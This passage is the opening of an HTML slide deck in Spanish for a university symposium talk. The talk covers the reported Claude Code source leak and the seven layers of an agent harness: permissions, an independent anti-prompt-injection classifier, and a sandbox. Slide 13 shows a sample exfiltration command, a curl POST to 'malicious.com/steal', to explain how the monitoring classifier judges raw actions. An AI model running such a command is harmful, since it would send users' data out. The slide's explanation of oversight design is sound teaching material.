@@ -1,0 +1,1690 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>IA Abierta — Simposio UPTC 2026 · Felipe Mantilla y Zabdiel Blanco</title>
+
+<!-- Fuentes -->
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Instrument+Serif:ital@0;1&family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&family=Caveat:wght@400;600;700&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+:root {
+  --bg-primary: #0a0a0a;
+  --bg-secondary: #111111;
+  --bg-tertiary: #1a1a1a;
+  --bg-card: #141414;
+  --text-primary: #f5f5f5;
+  --text-body: #d4d4d4;
+  --text-muted: #6b6b6b;
+  --text-dim: #404040;
+  --accent: #00ff88;
+  --accent-soft: #00cc6f;
+  --accent-glow: rgba(0, 255, 136, 0.15);
+  --danger: #ff3b5f;
+  --danger-soft: #cc2f4c;
+  --warning: #ffb800;
+  --border-subtle: rgba(255, 255, 255, 0.06);
+  --border-default: rgba(255, 255, 255, 0.12);
+  --font-serif: 'Instrument Serif', 'Times New Roman', serif;
+  --font-sans: 'Inter', -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
+  --font-mono: 'JetBrains Mono', 'Menlo', monospace;
+  --font-display: 'Space Grotesk', var(--font-sans);
+  --font-handwritten: 'Caveat', cursive;
+  --shadow-glow: 0 0 40px var(--accent-glow);
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+html, body {
+  height: 100vh;
+  overflow: hidden;
+  background: var(--bg-primary);
+  color: var(--text-body);
+  font-family: var(--font-sans);
+  font-size: 18px;
+  line-height: 1.6;
+}
+
+/* Deck container */
+.deck {
+  position: relative;
+  width: 100vw;
+  height: 100vh;
+  overflow: hidden;
+}
+
+/* Slides */
+.slide {
+  position: absolute;
+  inset: 0;
+  padding: 3rem 5rem;
+  display: none;
+  overflow: hidden;
+  background: var(--bg-primary);
+}
+
+.slide.active {
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  animation: slideIn 0.4s ease-out;
+}
+
+@keyframes slideIn {
+  from { opacity: 0; transform: translateX(20px); }
+  to { opacity: 1; transform: translateX(0); }
+}
+
+/* Typography */
+h1 {
+  font-family: var(--font-serif);
+  font-weight: 400;
+  color: var(--text-primary);
+  letter-spacing: -0.02em;
+  line-height: 1.1;
+  font-size: clamp(2.5rem, 5vw, 4rem);
+}
+
+h2 {
+  font-family: var(--font-serif);
+  font-weight: 400;
+  color: var(--text-primary);
+  letter-spacing: -0.01em;
+  font-size: clamp(2rem, 4vw, 3rem);
+}
+
+h3 {
+  font-family: var(--font-sans);
+  font-weight: 600;
+  color: var(--text-primary);
+  font-size: 1.5rem;
+}
+
+p {
+  color: var(--text-body);
+  line-height: 1.6;
+}
+
+code {
+  font-family: var(--font-mono);
+  font-size: 0.9em;
+  background: var(--bg-tertiary);
+  padding: 0.2em 0.4em;
+  border-radius: 4px;
+  color: var(--accent);
+}
+
+/* Components */
+.stat-block {
+  font-family: var(--font-display);
+  font-weight: 700;
+  font-size: clamp(4rem, 12vw, 10rem);
+  color: var(--accent);
+  line-height: 1;
+  letter-spacing: -0.03em;
+  text-shadow: var(--shadow-glow);
+}
+
+.stat-label {
+  font-family: var(--font-sans);
+  font-size: 1.25rem;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+  margin-top: 1rem;
+}
+
+.big-number {
+  font-family: var(--font-display);
+  font-size: clamp(5rem, 15vw, 12rem);
+  font-weight: 800;
+  color: var(--accent);
+  line-height: 0.9;
+  letter-spacing: -0.05em;
+  text-shadow: var(--shadow-glow);
+}
+
+.big-number-subtitle {
+  font-family: var(--font-serif);
+  font-size: 1.5rem;
+  color: var(--text-body);
+  margin-top: 1rem;
+  font-style: italic;
+}
+
+.quote-ancla {
+  font-family: var(--font-serif);
+  font-size: clamp(1.5rem, 3.5vw, 2.75rem);
+  line-height: 1.25;
+  color: var(--text-primary);
+  padding-left: 2rem;
+  border-left: 3px solid var(--accent);
+  max-width: 900px;
+  font-style: italic;
+}
+
+.handwritten {
+  font-family: var(--font-handwritten);
+  color: var(--text-muted);
+  font-size: 1.5rem;
+  display: inline-block;
+}
+
+.handwritten-rotated { transform: rotate(-2deg); }
+
+.comparison-table {
+  width: 100%;
+  border-collapse: collapse;
+  font-family: var(--font-sans);
+  margin: 1rem 0;
+}
+
+.comparison-table th {
+  background: var(--bg-secondary);
+  color: var(--text-muted);
+  text-transform: uppercase;
+  font-size: 0.8rem;
+  letter-spacing: 0.1em;
+  text-align: left;
+  padding: 0.75rem 1rem;
+  border-bottom: 2px solid var(--border-default);
+}
+
+.comparison-table td {
+  padding: 0.75rem 1rem;
+  border-bottom: 1px solid var(--border-subtle);
+  color: var(--text-body);
+}
+
+.comparison-table tr.highlight td {
+  background: linear-gradient(90deg, var(--accent-glow) 0%, transparent 100%);
+  color: var(--accent);
+  font-weight: 600;
+}
+
+.comparison-table .price-free {
+  color: var(--accent);
+  font-weight: 700;
+  font-family: var(--font-mono);
+}
+
+.enemy-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border-default);
+  border-left: 4px solid var(--danger);
+  padding: 2rem;
+  border-radius: 8px;
+  position: relative;
+  max-width: 800px;
+  margin: 0 auto;
+}
+
+.enemy-card .enemy-number {
+  position: absolute;
+  top: 1rem;
+  right: 1.5rem;
+  font-family: var(--font-display);
+  font-size: 3rem;
+  color: var(--danger-soft);
+  opacity: 0.5;
+  line-height: 1;
+}
+
+.enemy-card h3 {
+  font-family: var(--font-serif);
+  color: var(--danger);
+  margin-bottom: 0.5rem;
+  font-size: 1.8rem;
+}
+
+.enemy-card .defense {
+  margin-top: 1.5rem;
+  padding-top: 1rem;
+  border-top: 1px solid var(--border-subtle);
+  color: var(--accent);
+  font-family: var(--font-mono);
+  font-size: 0.9rem;
+}
+
+.person-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border-default);
+  padding: 1.5rem;
+  border-radius: 12px;
+  transition: all 0.3s ease;
+}
+
+.person-card:hover {
+  border-color: var(--accent);
+  transform: translateY(-4px);
+}
+
+.person-card .role {
+  font-family: var(--font-sans);
+  color: var(--accent);
+  font-size: 0.85rem;
+  text-transform: uppercase;
+  letter-spacing: 0.15em;
+  margin-bottom: 0.5rem;
+}
+
+.person-card .name {
+  font-family: var(--font-serif);
+  font-size: 1.5rem;
+  color: var(--text-primary);
+}
+
+.code-card {
+  background: var(--bg-tertiary);
+  border: 1px solid var(--border-subtle);
+  border-radius: 8px;
+  overflow: hidden;
+  font-family: var(--font-mono);
+  margin: 1rem 0;
+}
+
+.code-card .code-header {
+  background: var(--bg-secondary);
+  padding: 0.75rem 1rem;
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  border-bottom: 1px solid var(--border-subtle);
+}
+
+.code-card .code-dot {
+  width: 12px; height: 12px; border-radius: 50%; display: inline-block;
+}
+.code-card .code-dot.red { background: #ff5f56; }
+.code-card .code-dot.yellow { background: #ffbd2e; }
+.code-card .code-dot.green { background: #27c93f; }
+
+.code-card .code-title {
+  color: var(--text-muted);
+  font-size: 0.85rem;
+  margin-left: 0.5rem;
+}
+
+.code-card .code-body {
+  padding: 1.5rem;
+  color: var(--text-body);
+  line-height: 1.6;
+  font-size: 0.9rem;
+  white-space: pre-wrap;
+}
+
+.code-card .prompt-line::before {
+  content: '$ ';
+  color: var(--accent);
+}
+
+.transition-slide {
+  background: radial-gradient(ellipse at center, var(--bg-secondary) 0%, var(--bg-primary) 70%) !important;
+  text-align: center;
+  align-items: center !important;
+}
+
+.transition-slide .act-label {
+  font-family: var(--font-mono);
+  font-size: 0.9rem;
+  color: var(--accent);
+  text-transform: uppercase;
+  letter-spacing: 0.3em;
+  margin-bottom: 2rem;
+}
+
+.transition-slide .act-title {
+  font-family: var(--font-serif);
+  font-size: clamp(3rem, 8vw, 6rem);
+  color: var(--text-primary);
+  font-weight: 400;
+  line-height: 1.1;
+  max-width: 900px;
+}
+
+/* Animation for breathing logo */
+@keyframes breathe {
+  0%, 100% { transform: scale(1); filter: drop-shadow(0 0 20px var(--accent-glow)); }
+  50% { transform: scale(1.03); filter: drop-shadow(0 0 40px var(--accent)); }
+}
+.breathing-logo { animation: breathe 3s ease-in-out infinite; }
+
+/* Utility */
+.text-accent { color: var(--accent); }
+.text-danger { color: var(--danger); }
+.text-muted { color: var(--text-muted); }
+.font-serif { font-family: var(--font-serif); }
+.font-mono { font-family: var(--font-mono); }
+
+.flex-center { display: flex; align-items: center; justify-content: center; }
+.grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 2rem; }
+.grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 2rem; }
+
+.text-xl { font-size: clamp(1.5rem, 3vw, 2rem); }
+.text-lg { font-size: 1.25rem; }
+.text-md { font-size: 1rem; }
+.text-sm { font-size: 0.875rem; }
+
+/* Nav */
+.nav-controls {
+  position: fixed;
+  bottom: 1rem;
+  right: 1rem;
+  display: flex;
+  gap: 0.5rem;
+  align-items: center;
+  z-index: 100;
+  background: rgba(10, 10, 10, 0.85);
+  backdrop-filter: blur(10px);
+  border: 1px solid var(--border-subtle);
+  padding: 0.5rem 1rem;
+  border-radius: 8px;
+}
+
+.nav-controls button {
+  background: transparent;
+  color: var(--text-muted);
+  border: 1px solid var(--border-subtle);
+  padding: 0.4rem 0.8rem;
+  border-radius: 4px;
+  cursor: pointer;
+  font-family: var(--font-mono);
+  font-size: 0.85rem;
+  transition: all 0.2s;
+}
+
+.nav-controls button:hover {
+  color: var(--accent);
+  border-color: var(--accent);
+}
+
+.nav-counter {
+  color: var(--accent);
+  font-family: var(--font-mono);
+  font-size: 0.9rem;
+  min-width: 60px;
+  text-align: center;
+}
+
+/* Progress bar */
+.progress-bar {
+  position: fixed;
+  top: 0;
+  left: 0;
+  height: 3px;
+  background: var(--accent);
+  transition: width 0.3s ease;
+  z-index: 100;
+  box-shadow: 0 0 10px var(--accent-glow);
+}
+
+/* Speaker notes panel */
+.notes-panel {
+  position: fixed;
+  bottom: 0;
+  left: 0;
+  right: 0;
+  max-height: 40vh;
+  background: #fafafa;
+  color: #1a1a1a;
+  padding: 1.5rem 2rem;
+  overflow-y: auto;
+  transform: translateY(100%);
+  transition: transform 0.3s ease;
+  z-index: 99;
+  box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.5);
+  font-family: var(--font-sans);
+  font-size: 0.95rem;
+  line-height: 1.6;
+}
+
+.notes-panel.open {
+  transform: translateY(0);
+}
+
+.notes-panel h4 {
+  color: #0a0a0a;
+  font-size: 0.8rem;
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+  margin-top: 1rem;
+  margin-bottom: 0.5rem;
+}
+
+.notes-panel h4:first-child { margin-top: 0; }
+
+.notes-panel blockquote {
+  border-left: 3px solid #00cc6f;
+  padding-left: 1rem;
+  color: #333;
+  font-style: italic;
+  margin: 0.75rem 0;
+}
+
+.notes-panel strong { color: #00cc6f; }
+
+.notes-panel code {
+  background: #e8e8e8;
+  color: #0a0a0a;
+  padding: 0.1em 0.3em;
+  border-radius: 3px;
+  font-size: 0.9em;
+}
+
+.notes-panel ul { padding-left: 1.5rem; margin: 0.5rem 0; }
+.notes-panel li { margin: 0.3rem 0; }
+
+.notes-panel .notes-title {
+  color: #0a0a0a;
+  font-weight: 700;
+  font-size: 1.1rem;
+  margin-bottom: 0.5rem;
+  border-bottom: 1px solid #ddd;
+  padding-bottom: 0.5rem;
+}
+
+img { max-width: 100%; height: auto; }
+
+/* Help overlay */
+.help-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(10, 10, 10, 0.95);
+  backdrop-filter: blur(8px);
+  display: none;
+  align-items: center;
+  justify-content: center;
+  z-index: 200;
+}
+
+.help-overlay.open { display: flex; }
+
+.help-content {
+  background: var(--bg-card);
+  padding: 2rem 3rem;
+  border-radius: 12px;
+  border: 1px solid var(--border-default);
+  max-width: 500px;
+}
+
+.help-content h3 {
+  color: var(--accent);
+  margin-bottom: 1.5rem;
+}
+
+.help-content table {
+  width: 100%;
+}
+
+.help-content td {
+  padding: 0.4rem 0;
+  color: var(--text-body);
+}
+
+.help-content td:first-child {
+  font-family: var(--font-mono);
+  color: var(--accent);
+  padding-right: 2rem;
+  white-space: nowrap;
+}
+</style>
+</head>
+<body>
+
+<!-- Progress bar -->
+<div class="progress-bar" id="progress"></div>
+
+<div class="deck" id="deck">
+
+<!-- ============================================ -->
+<!-- SLIDE 1 · Terminal con cursor parpadeando    -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-1">
+  <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 3rem; height: 100%;">
+    <div class="code-card" style="width: 80%; max-width: 900px;">
+      <div class="code-header">
+        <span class="code-dot red"></span>
+        <span class="code-dot yellow"></span>
+        <span class="code-dot green"></span>
+        <span class="code-title">claude-local gemma4:26b — WiFi: <span class="text-danger">desconectado</span></span>
+      </div>
+      <div class="code-body">
+        <div class="prompt-line text-accent" style="animation: blink 1s step-end infinite;">_</div>
+      </div>
+    </div>
+    <p class="handwritten handwritten-rotated text-muted">↑ esperando el primer prompt</p>
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 2 · Título                             -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-2">
+  <div style="text-align: center;">
+    <h1 style="font-size: clamp(3rem, 7vw, 6rem);">IA Abierta</h1>
+    <p class="text-xl text-muted" style="margin-top: 1rem;">
+      El Poder, la Arquitectura y<br>el Precio de No Entender lo que Generas
+    </p>
+
+    <div style="margin-top: 4rem; display: flex; gap: 3rem; justify-content: center; align-items: center;">
+      <div style="text-align: left;">
+        <div class="text-sm text-muted" style="letter-spacing: 0.2em; text-transform: uppercase;">Ponentes</div>
+        <div class="font-serif text-xl" style="margin-top: 0.5rem;">Felipe Mantilla</div>
+        <div class="font-serif text-xl">Zabdiel Blanco</div>
+      </div>
+      <div style="border-left: 1px solid rgba(255,255,255,0.1); padding-left: 3rem; text-align: left;">
+        <div class="text-sm text-muted" style="letter-spacing: 0.2em; text-transform: uppercase;">Evento</div>
+        <div class="font-serif text-xl" style="margin-top: 0.5rem;">Simposio UPTC</div>
+        <div class="font-mono text-muted text-sm">Abril 2026</div>
+      </div>
+      <div style="border-left: 1px solid rgba(255,255,255,0.1); padding-left: 3rem;">
+        <img src="public/logos/uptc.png" alt="UPTC" style="height: 90px; filter: invert(1) brightness(1.2);" />
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 3 · Contraste histórico                -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-3">
+  <div style="max-width: 1000px; margin: 0 auto; text-align: center;">
+    <p class="text-xl text-muted" style="margin-bottom: 2rem;">Lo que acaban de ver...</p>
+    <div class="grid-2" style="gap: 4rem;">
+      <div>
+        <div class="handwritten text-danger">Hace 2 años</div>
+        <div class="stat-block" style="color: #ff3b5f; font-size: 4rem; margin-top: 1rem;">$10,000</div>
+        <div class="stat-label">al mes en infraestructura</div>
+      </div>
+      <div>
+        <div class="handwritten">Hoy</div>
+        <div class="stat-block" style="font-size: 4rem; margin-top: 1rem;">$0</div>
+        <div class="stat-label">corriendo en un laptop</div>
+      </div>
+    </div>
+    <p class="font-serif text-xl" style="margin-top: 4rem; color: #f5f5f5;">
+      Esto hace dos años lo hicieron<br>
+      <span class="text-accent">cuatro empresas en el mundo.</span>
+    </p>
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 4 · El héroe                           -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-4">
+  <h1 style="text-align: center;">El héroe de esta sala</h1>
+  <div class="grid-2" style="gap: 3rem; margin-top: 2rem; align-items: center;">
+    <img src="public/diagrams/hero-portrait.svg" alt="Estudiante UPTC" style="opacity: 0.9;" />
+    <div>
+      <p class="text-lg" style="line-height: 1.8;">
+        Un estudiante.<br>
+        Octavo, noveno semestre.<br>
+        Un <strong>Lenovo</strong> o <strong>Dell</strong>, no un Mac caro.<br>
+        Audífonos entre clases.
+      </p>
+      <p class="quote-ancla" style="margin-top: 2rem; font-size: 1.4rem;">
+        "¿Todo este esfuerzo de cuatro años va a servir para algo?"
+      </p>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 5 · La filtración                      -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-5">
+  <div class="grid-2" style="gap: 3rem; align-items: center;">
+    <div>
+      <div class="text-sm text-accent" style="letter-spacing: 0.3em; text-transform: uppercase; margin-bottom: 1.5rem;">
+        31 · MARZO · 2026
+      </div>
+      <h1 style="font-size: clamp(1.75rem, 3.5vw, 2.75rem); line-height: 1.15;">
+        Anthropic accidentalmente expuso
+        <span class="text-accent font-serif" style="font-style: italic;">todo</span>
+        el código fuente de Claude Code en npm.
+      </h1>
+      <div style="display: flex; align-items: center; gap: 1rem; margin-top: 2rem;">
+        <img src="public/logos/claude.png" alt="Anthropic" style="height: 40px; opacity: 0.9;" />
+        <p class="font-mono text-muted" style="font-size: 0.85rem;">
+          // el regalo pedagógico<br>// que cambió la conversación
+        </p>
+      </div>
+    </div>
+    <div style="text-align: center;">
+      <img src="public/screenshots/x-filtracion.png" alt="Tweet de Chaofan Shou" style="max-height: 60vh; border-radius: 12px; box-shadow: 0 0 40px rgba(0, 255, 136, 0.15);" />
+      <p class="handwritten text-muted" style="margin-top: 0.5rem; font-size: 0.9rem;">
+        @Fried_rice · 35.4M views
+      </p>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 6 · 512,000 líneas                     -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-6">
+  <div style="text-align: center;">
+    <div class="big-number">512,000</div>
+    <div class="big-number-subtitle text-accent">líneas de código expuestas</div>
+    <div class="grid-3" style="margin-top: 4rem; max-width: 1000px; margin-left: auto; margin-right: auto;">
+      <div class="person-card" style="text-align: center;">
+        <div class="role">Contenido revelado</div>
+        <div class="name" style="font-size: 1.25rem; margin-top: 0.5rem;">~40 herramientas</div>
+      </div>
+      <div class="person-card" style="text-align: center;">
+        <div class="role">System prompts</div>
+        <div class="name" style="font-size: 1.25rem; margin-top: 0.5rem;">Todos los prompts</div>
+      </div>
+      <div class="person-card" style="text-align: center;">
+        <div class="role">Arquitectura</div>
+        <div class="name" style="font-size: 1.25rem; margin-top: 0.5rem;">Todo el harness</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 7 · Claw-Code                          -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-7">
+  <div class="grid-2" style="gap: 3rem; align-items: center;">
+    <div>
+      <h1>Claw-Code</h1>
+      <p class="text-lg text-muted" style="margin-top: 1rem;">
+        Sigrid Jin, desarrolladora independiente.<br>
+        Sin empresa. Sin laboratorio. Sin plata.
+      </p>
+      <p class="font-serif text-xl" style="margin-top: 2rem;">
+        Reescribió el corazón de Claude Code en Python usando el código filtrado como blueprint.
+      </p>
+      <div style="margin-top: 2rem;">
+        <div class="big-number" style="font-size: clamp(3rem, 7vw, 5rem);">150K+</div>
+        <div class="big-number-subtitle" style="font-size: 1.2rem;">estrellas de GitHub</div>
+      </div>
+      <p class="handwritten text-muted" style="margin-top: 1.5rem;">
+        el repo más rápido en crecer en la historia de GitHub
+      </p>
+    </div>
+    <div style="text-align: center;">
+      <img src="public/logos/claw-code.png" alt="Claw-Code star history" style="border-radius: 8px; border: 1px solid rgba(255,255,255,0.1);" />
+      <p class="handwritten text-accent" style="margin-top: 1rem;">
+        curva de estrellas real · abril 2026
+      </p>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 8 · Modelo vs Harness                  -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-8">
+  <h2 style="text-align: center; margin-bottom: 2rem;">La pregunta que ningún desarrollador se hace</h2>
+  <div class="grid-2" style="gap: 4rem; align-items: center;">
+    <div style="text-align: center;">
+      <img src="public/diagrams/brain-vs-body.svg" alt="Cerebro en silla vs cerebro con cuerpo" />
+    </div>
+    <div>
+      <p class="text-lg text-muted" style="margin-bottom: 1rem;">A la izquierda:</p>
+      <p class="font-serif text-xl">Opus 4.7 directo desde la API.</p>
+      <p style="margin-top: 0.5rem;">Un cerebro brillante sentado en una silla. Te dice cosas. Nada más.</p>
+      <p class="text-lg text-muted" style="margin-top: 2rem; margin-bottom: 1rem;">A la derecha:</p>
+      <p class="font-serif text-xl text-accent">Opus 4.7 en Claude Code.</p>
+      <p style="margin-top: 0.5rem;"><strong>El mismo cerebro</strong> pero con manos, ojos, memoria y reglas.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 9 · 188K vs 33K                        -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-9">
+  <div style="text-align: center;">
+    <p class="text-sm text-muted" style="letter-spacing: 0.2em; text-transform: uppercase; margin-bottom: 1rem;">
+      Misma tarea · Mismo modelo (Opus 4.6)
+    </p>
+    <div class="grid-2" style="gap: 4rem; max-width: 900px; margin: 2rem auto;">
+      <div>
+        <div class="stat-block" style="color: #ff3b5f; font-size: clamp(3rem, 8vw, 6rem);">188K</div>
+        <div class="stat-label" style="color: #ff3b5f;">tokens en Cursor</div>
+      </div>
+      <div>
+        <div class="stat-block" style="font-size: clamp(3rem, 8vw, 6rem);">33K</div>
+        <div class="stat-label">tokens en Claude Code</div>
+      </div>
+    </div>
+    <p class="quote-ancla" style="margin: 3rem auto; text-align: center; max-width: 900px; border-left: none; padding-left: 0;">
+      El modelo no es el producto.<br>
+      <span class="text-accent">La orquestación</span> es el producto.
+    </p>
+    <p class="font-mono text-muted text-sm">5.7x más eficiente con el mismo cerebro</p>
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 10 · Las 7 capas                       -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-10">
+  <h1>Las 7 capas del harness</h1>
+  <div class="grid-3" style="gap: 1rem; margin-top: 2rem;">
+    <div class="person-card" style="text-align: center; padding: 1rem;">
+      <div class="big-number" style="font-size: 2.5rem;">1</div>
+      <div style="margin-top: 0.5rem; color: var(--text-primary);">Agent Loop</div>
+      <div class="font-mono text-muted text-sm">88 líneas</div>
+    </div>
+    <div class="person-card" style="text-align: center; padding: 1rem;">
+      <div class="big-number" style="font-size: 2.5rem;">2</div>
+      <div style="margin-top: 0.5rem; color: var(--text-primary);">~40 Tools</div>
+      <div class="font-mono text-muted text-sm">Read/Write/Bash</div>
+    </div>
+    <div class="person-card" style="text-align: center; padding: 1rem;">
+      <div class="big-number" style="font-size: 2.5rem;">3</div>
+      <div style="margin-top: 0.5rem; color: var(--text-primary);">Permisos</div>
+      <div class="font-mono text-muted text-sm">3 tiers</div>
+    </div>
+  </div>
+  <div class="grid-3" style="gap: 1rem; margin-top: 1rem;">
+    <div class="person-card" style="text-align: center; padding: 1rem; border-color: var(--accent);">
+      <div class="big-number" style="font-size: 2.5rem;">4</div>
+      <div style="margin-top: 0.5rem; color: var(--accent);">Classifier ★</div>
+      <div class="font-mono text-muted text-sm">Independiente</div>
+    </div>
+    <div class="person-card" style="text-align: center; padding: 1rem;">
+      <div class="big-number" style="font-size: 2.5rem;">5</div>
+      <div style="margin-top: 0.5rem; color: var(--text-primary);">Contexto</div>
+      <div class="font-mono text-muted text-sm">5 estrategias</div>
+    </div>
+    <div class="person-card" style="text-align: center; padding: 1rem;">
+      <div class="big-number" style="font-size: 2.5rem;">6</div>
+      <div style="margin-top: 0.5rem; color: var(--text-primary);">Subagentes</div>
+      <div class="font-mono text-muted text-sm">Paralelo</div>
+    </div>
+  </div>
+  <div style="max-width: 33%; margin: 1rem auto 0;">
+    <div class="person-card" style="text-align: center; padding: 1rem;">
+      <div class="big-number" style="font-size: 2.5rem;">7</div>
+      <div style="margin-top: 0.5rem; color: var(--text-primary);">Sandbox</div>
+      <div class="font-mono text-muted text-sm">OS-level</div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 11 · Agent Loop                        -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-11">
+  <h2 style="text-align: center;">1. Agent Loop</h2>
+  <div class="grid-2" style="gap: 2rem; margin-top: 1rem; align-items: center;">
+    <div>
+      <img src="public/diagrams/agent-loop-circular.svg" alt="Agent Loop circular" />
+    </div>
+    <div>
+      <p class="text-lg" style="line-height: 1.7;">
+        El corazón de Claude Code es <strong>una lista de mensajes</strong> y un <code>while</code> loop.
+      </p>
+      <p class="text-lg" style="margin-top: 1.2rem;">
+        No hay state machine. No hay workflow graph. No hay Redis.
+      </p>
+      <p class="text-lg" style="margin-top: 1.2rem;">
+        <strong class="text-accent">~88 líneas de código.</strong> Todo.
+      </p>
+      <p class="font-serif text-xl text-accent" style="margin-top: 2rem; font-style: italic;">
+        La simplicidad es la feature.
+      </p>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 12 · Tools + Permisos                  -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-12">
+  <h1>2-3. Herramientas + Permisos</h1>
+  <div class="grid-2" style="gap: 3rem; margin-top: 2rem;">
+    <div>
+      <h3 class="text-accent">~40 herramientas</h3>
+      <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.5rem; margin-top: 1rem; font-family: var(--font-mono); font-size: 0.9rem;">
+        <div>Read</div><div>Write</div><div>Edit</div><div>Bash</div>
+        <div>Grep</div><div>Glob</div><div>WebFetch</div><div>WebSearch</div>
+        <div>Agent</div><div>TaskCreate</div><div>NotebookEdit</div><div class="text-muted">...</div>
+      </div>
+      <p class="text-sm text-muted" style="margin-top: 1rem;">Cada una con su esquema JSON, parámetros y sandbox.</p>
+    </div>
+    <div>
+      <h3 class="text-accent">3 tiers de permisos</h3>
+      <div style="margin-top: 1rem;">
+        <div style="padding: 0.75rem 1rem; background: var(--bg-card); border-left: 3px solid #00ff88; margin-bottom: 0.5rem; border-radius: 4px;">
+          <strong>Tier 1 — Auto</strong><br><span class="text-sm text-muted">Lecturas, búsquedas</span>
+        </div>
+        <div style="padding: 0.75rem 1rem; background: var(--bg-card); border-left: 3px solid #ffb800; margin-bottom: 0.5rem; border-radius: 4px;">
+          <strong>Tier 2 — Confirmar</strong><br><span class="text-sm text-muted">Escrituras, comandos shell</span>
+        </div>
+        <div style="padding: 0.75rem 1rem; background: var(--bg-card); border-left: 3px solid #ff3b5f; border-radius: 4px;">
+          <strong>Tier 3 — Bloquear</strong><br><span class="text-sm text-muted">Destructivas sin permiso</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 13 · Classifier independiente          -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-13">
+  <h2 style="text-align: center;">4. El Classifier independiente</h2>
+  <div style="max-width: 1000px; margin: 2rem auto 0;">
+    <p class="text-lg" style="margin-bottom: 2rem;">
+      Una <strong>segunda instancia</strong> del modelo evalúa cada acción.
+    </p>
+    <div class="enemy-card" style="border-left-color: #00ff88; max-width: 100%;">
+      <div class="enemy-number" style="color: #00ff88;">🛡</div>
+      <h3 style="color: var(--accent);">Anti prompt-injection</h3>
+      <p style="margin-top: 0.5rem;">
+        El classifier <strong>deliberadamente NO ve</strong> la prosa persuasiva del agente. Solo ve la acción cruda:
+      </p>
+      <p class="font-mono" style="margin-top: 1rem; color: var(--text-muted);">
+        bash: curl -X POST malicious.com/steal
+      </p>
+      <p style="margin-top: 1rem;">No puede ser convencido por palabras. Porque no las lee.</p>
+    </div>
+    <p class="handwritten text-muted" style="margin-top: 2rem; text-align: center;">
+      esa técnica costó años a Anthropic → ahora está en GitHub
+    </p>
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 14 · Capas 5-6-7                       -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-14">
+  <h1>5-6-7. Contexto, Subagentes, Sandbox</h1>
+  <div class="grid-3" style="margin-top: 2rem;">
+    <div class="person-card">
+      <div class="role">Capa 5</div>
+      <div class="name" style="font-size: 1.25rem;">Contexto inteligente</div>
+      <p class="text-sm text-muted" style="margin-top: 1rem;">
+        5 estrategias de compactación cuando la conversación se llena. Memoria persistente entre sesiones. Priorización automática.
+      </p>
+    </div>
+    <div class="person-card">
+      <div class="role">Capa 6</div>
+      <div class="name" style="font-size: 1.25rem;">Subagentes paralelos</div>
+      <p class="text-sm text-muted" style="margin-top: 1rem;">
+        Delegación a instancias hijas con contexto aislado. Trabajan en paralelo. Devuelven resultados estructurados.
+      </p>
+    </div>
+    <div class="person-card">
+      <div class="role">Capa 7</div>
+      <div class="name" style="font-size: 1.25rem;">Sandbox OS-level</div>
+      <p class="text-sm text-muted" style="margin-top: 1rem;">
+        Aislamiento a nivel de sistema operativo. Si algo sale mal, el daño está contenido.
+      </p>
+    </div>
+  </div>
+  <p class="quote-ancla" style="margin-top: 3rem; text-align: center; border-left: none; font-size: 1.5rem; max-width: 100%;">
+    Este es el <span class="text-accent">regalo pedagógico</span>.<br>
+    Ahora podés leerlo, replicarlo y adaptarlo.
+  </p>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 15 · Transición Acto 2                 -->
+<!-- ============================================ -->
+<section class="slide transition-slide" data-notes="slide-15">
+  <div class="act-label">Acto II</div>
+  <h1 class="act-title">De la teoría<br>a la terminal</h1>
